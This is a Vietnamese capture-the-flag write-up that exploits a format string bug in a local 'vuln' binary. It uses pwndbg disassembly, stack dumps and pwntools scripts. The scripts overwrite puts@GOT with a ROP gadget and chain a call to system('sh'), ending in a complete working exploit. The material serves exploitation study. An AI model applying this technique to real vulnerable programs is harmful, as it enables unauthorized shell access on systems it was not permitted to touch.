# GOT overwrite with format string

Oke theo mình thì bài này khá là hay về format string, khi mà có thể lợi dụng nó để ghi lên 1 địa chỉ có thể ghi được ở tham số chỉ đính

Để nói rõ hơn thì như sau: giả dụ ở tham số thứ 5 của hàm printf(**bị format string**) là địa chỉ ô nhớ chứa giá trị là 0x1, thì ta có thể lợi dụng formatstring như sau %15p%5$n là t sẽ over write được từ **0x1** => **0xf**

> #### % <*giá trị dạng decimal*> p% <*vị trí cần ghi đè ở tham số thứ mấy*> $n

Đầu tiên ta cần check asm code :

```shell
pwndbg> info func
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401090  puts@plt
0x00000000004010a0  __stack_chk_fail@plt
0x00000000004010b0  system@plt
0x00000000004010c0  printf@plt
0x00000000004010d0  fgets@plt
0x00000000004010e0  setvbuf@plt
0x00000000004010f0  _start
0x0000000000401120  _dl_relocate_static_pie
0x0000000000401130  deregister_tm_clones
0x0000000000401160  register_tm_clones
0x00000000004011a0  __do_global_dtors_aux
0x00000000004011d0  frame_dummy
0x00000000004011d6  main
0x000000000040129e  win
0x00000000004012c0  __libc_csu_init
0x0000000000401330  __libc_csu_fini
0x0000000000401338  _fini

```

### Main func

```shell
pwndbg> disass main
Dump of assembler code for function main:
   0x00000000004011d6 <+0>:     endbr64
   0x00000000004011da <+4>:     push   rbp
   0x00000000004011db <+5>:     mov    rbp,rsp
   0x00000000004011de <+8>:     sub    rsp,0x110
   0x00000000004011e5 <+15>:    mov    rax,QWORD PTR fs:0x28
   0x00000000004011ee <+24>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000004011f2 <+28>:    xor    eax,eax
   0x00000000004011f4 <+30>:    mov    rax,QWORD PTR [rip+0x2e65]        # 0x404060 <stdout@@GLIBC_2.2.5>
   0x00000000004011fb <+37>:    mov    ecx,0x0
   0x0000000000401200 <+42>:    mov    edx,0x2
   0x0000000000401205 <+47>:    mov    esi,0x0
   0x000000000040120a <+52>:    mov    rdi,rax
   0x000000000040120d <+55>:    call   0x4010e0 <setvbuf@plt>
   0x0000000000401212 <+60>:    mov    rax,QWORD PTR [rip+0x2e57]        # 0x404070 <stdin@@GLIBC_2.2.5>
   0x0000000000401219 <+67>:    mov    ecx,0x0
   0x000000000040121e <+72>:    mov    edx,0x2
   0x0000000000401223 <+77>:    mov    esi,0x0
   0x0000000000401228 <+82>:    mov    rdi,rax
   0x000000000040122b <+85>:    call   0x4010e0 <setvbuf@plt>
   0x0000000000401230 <+90>:    lea    rdi,[rip+0xdd1]        # 0x402008
   0x0000000000401237 <+97>:    call   0x401090 <puts@plt>
   0x000000000040123c <+102>:   mov    rdx,QWORD PTR [rip+0x2e2d]        # 0x404070 <stdin@@GLIBC_2.2.5>
   0x0000000000401243 <+109>:   lea    rax,[rbp-0x110]
   0x000000000040124a <+116>:   mov    esi,0x100
   0x000000000040124f <+121>:   mov    rdi,rax
   0x0000000000401252 <+124>:   call   0x4010d0 <fgets@plt>
   0x0000000000401257 <+129>:   lea    rax,[rbp-0x110]
   0x000000000040125e <+136>:   mov    rdi,rax
   0x0000000000401261 <+139>:   mov    eax,0x0
   0x0000000000401266 <+144>:   call   0x4010c0 <printf@plt>
   0x000000000040126b <+149>:   lea    rdi,[rip+0xdb6]        # 0x402028
   0x0000000000401272 <+156>:   call   0x401090 <puts@plt>
   0x0000000000401277 <+161>:   lea    rdi,[rip+0xdca]        # 0x402048
   0x000000000040127e <+168>:   call   0x401090 <puts@plt>
   0x0000000000401283 <+173>:   mov    eax,0x0
   0x0000000000401288 <+178>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x000000000040128c <+182>:   xor    rcx,QWORD PTR fs:0x28
   0x0000000000401295 <+191>:   je     0x40129c <main+198>
   0x0000000000401297 <+193>:   call   0x4010a0 <__stack_chk_fail@plt>
   0x000000000040129c <+198>:   leave
   0x000000000040129d <+199>:   ret
End of assembler dump.

```

### win func

```shell
pwndbg> disass win
Dump of assembler code for function win:
   0x000000000040129e <+0>:     endbr64
   0x00000000004012a2 <+4>:     push   rbp
   0x00000000004012a3 <+5>:     mov    rbp,rsp
   0x00000000004012a6 <+8>:     lea    rdi,[rip+0xdc5]        # 0x402072
   0x00000000004012ad <+15>:    call   0x4010b0 <system@plt>
   0x00000000004012b2 <+20>:    nop
   0x00000000004012b3 <+21>:    pop    rbp
   0x00000000004012b4 <+22>:    ret
End of assembler dump.
pwndbg> x/s 0x402072
0x402072:       "cat flag.txt >/dev/null"

```
Với **>/dev/null** thì thật vô nghĩa thì call hàm win, tuy nhiên ta vẫn có được hàm **system**, oke nếu là system thì ta cần thêm tham số là */bin/sh hoặc là sh* ở đây mình sẽ dùng *sh* cho gọn nhẹ.

Với **vmmap** ta có thể chọn được địa chỉ ghi *sh* hợp lí, tránh ghi đè.

OK, đầu tiên ta sẽ tiến hành thử nghiệm khả năng tuyệt vời của format string. Với format string **$n** ta có thể ghi được 4 bytes vào địa chỉ chỉ định.

Ở đây ta thấy sau hàm printf có hàm puts, trông khá vô nghĩa, mục tiêu đầu tiên là replace puts_got => địa chỉ pop_rdi 

Đặt breakpoint và check xem khi này thì puts_got đang trỏ đến địa chỉ gì khi mà puts đã được gọi 1 lần trước đó.



```shell
pwndbg> x/8z 0x404018
0x404018 <puts@got.plt>:        0x30    0x10    0x40    0x00    0x00    0x00    0x00    0x00
pwndbg> c
Continuing.
Send your string to be printed:
%6$p
0xa70243625

Breakpoint 3, 0x0000000000401272 in main ()

```

```shell
─────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdf50 ◂— 0xa70243625 /* '%6$p\n' */
01:0008│     0x7fffffffdf58 ◂— 0x0
... ↓        6 skipped
───────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► 0         0x401272 main+156
   1   0x7ffff7db7d90 __libc_start_call_main+128
   2   0x7ffff7db7e40 __libc_start_main+128
   3         0x40111e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/8z 0x404018
0x404018 <puts@got.plt>:        0xd0    0xee    0xe0    0xf7    0xff    0x7f    0x00    0x00
```

Có 2 vấn đề quan trọng ở trên:

* Trước khi đựoc gọi từ lần đầu tiên thì puts_got sẽ chứa địa chỉ 3 bytes cụ thể là **0x00401030** này chính là địa chỉ của hàm tìm kiếm địa chỉ thực, sau đấy từ lần thứ 2 thì got đã update => **0x00007ffff7e0eed0** 6 bytes. Trong khi thg **$n** của format string chỉ ghi được 4 bytes do đó ta phải ghi 2 lần 

* Ta thấy khi nhập **%6$p** thì giá trị được in ra nó khớp với giá trị tại cái chỗ ta nhập, theo như kinh nghiệm của người anh mình tham khảo thì ***thường là chuỗi mình nhập vào sẽ là tham số thứ 6 của hàm prinf***

OKe, giờ ta xem:

```python
>>> 0x0000000000401323
4199203

```

```python
from pwn import *

r = process("./vuln")
gdb.attach(r, api=True)

pop_rdi_ret = 0x0000000000401323
ret = 0x000000000040101a
system = 0x4010b0
binsh = 0x404080
puts_got = 0x404018

payload = b"%10$n%4199203p%9$n------" + p64(puts_got) + p64(puts_got + 4)

r.sendline(payload)
r.interactive()

```
Nên nhớ chuỗi format string của ta phải ghi đủ stack, **len % 8 = 0**

magic

```shell
pwndbg> x/z 0x404018
0x404018 <puts@got.plt>:        0x00401323
```

continue

Chuỗi sh = 0x6873 = 26739

Do đó ta cần in ra trước 26739 kí tự rồi write giá trị vào địa chỉ chứ bin_sh

OKe,

```python
from pwn import *

r = process("./vuln")
gdb.attach(r, api=True)

pop_rdi_ret = 0x0000000000401323
ret = 0x000000000040101a
system = 0x4010b0
binsh = 0x404080
puts_got = 0x404018

payload = b"%12$n%26739p%10$n%4172464p%11$n-" + p64(binsh) + p64(puts_got) + p64(puts_got + 4)

r.sendline(payload)
r.interactive()

```

stack trước ghi gọi puts:

```shell
00:0000│ rsp 0x7ffe526c2080 ◂— 0x3632256e24323125 ('%12$n%26')
01:0008│     0x7ffe526c2088 ◂— 0x2430312570393337 ('739p%10$')
02:0010│     0x7ffe526c2090 ◂— 0x363432373134256e ('n%417246')
03:0018│     0x7ffe526c2098 ◂— 0x2d6e243131257034 ('4p%11$n-')
04:0020│     0x7ffe526c20a0 —▸ 0x404080 ◂— 0x6873 /* 'sh' */

```
oái oăm là lúc này gọi **pop_rdi** là dính bẫy, stack vẫn đang chứa chuỗi ta nhập vào do đó ta cần pop sạch stack. rồi mới thêm **pop_rdi**
ngay sau là *chuỗi sh* xong rồi tiếp theo là hàm **system**, để khi pop rdi xong nó ret => system 

Sau khi pop 4 stack ra thì có vẻ vẫn còn sót 1 ẻm:

```shell
───────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────── RAX  0x401320 (__libc_csu_init+96) ◂— pop r14
 RBX  0x0
 RCX  0x7f496b2c7a37 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x0
 RDI  0x402028 ◂— 'As someone wise once said, `sh`'
 RSI  0x7fff6ef04010 ◂— 0x2020202020202020 ('        ')
 R8   0x1320
 R9   0x0
 R10  0x0
 R11  0x246
*R12  0x401277 (main+161) ◂— lea rdi, [rip + 0xdca]
*R13  0x3632256e24323125 ('%12$n%26')
*R14  0x2430312570393337 ('739p%10$')
*R15  0x353432373134256e ('n%417245')
 RBP  0x7fff6ef06240 ◂— 0x1
*RSP  0x7fff6ef06148 ◂— 0x2d6e243131257037 ('7p%11$n-')
*RIP  0x401324 (__libc_csu_init+100) ◂— ret
────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────── ► 0x401324 <__libc_csu_init+100>    ret    <0x2d6e243131257037>










─────────────────────────────────[ STACK ]──────────────────────────────────00:0000│ rsp 0x7fff6ef06148 ◂— 0x2d6e243131257037 ('7p%11$n-')
01:0008│     0x7fff6ef06150 —▸ 0x404080 ◂— 0x6873 /* 'sh' */
02:0010│     0x7fff6ef06158 —▸ 0x404018 (puts@got[plt]) —▸ 0x40131c (__libc_csu_init+92) ◂— pop r12
03:0018│     0x7fff6ef06160 —▸ 0x40401c (puts@got[plt]+4) ◂— 0x40104000000000

```

OKe thoi pop 5 stack, và đứa pop_rdi vào , binsh, system luôn 

For sure, yah we done :3

### Exploit

```python
from pwn import *

r = process("./vuln")
gdb.attach(r, api=True)

pop_rdi_ret = 0x0000000000401323
pop4_ret = 0x000000000040131c
pop5_ret = 0x000000000040131b
ret = 0x000000000040101a
system = 0x4010b0
binsh = 0x404080
puts_got = 0x404018

payload = b"%14$n%26739p%11$n%4172456p%13$n-" + p64(pop_rdi_ret) + p64(binsh) + p64(system) + p64(puts_got) + p64(puts_got + 4)

r.sendline(payload)
r.interactive()

```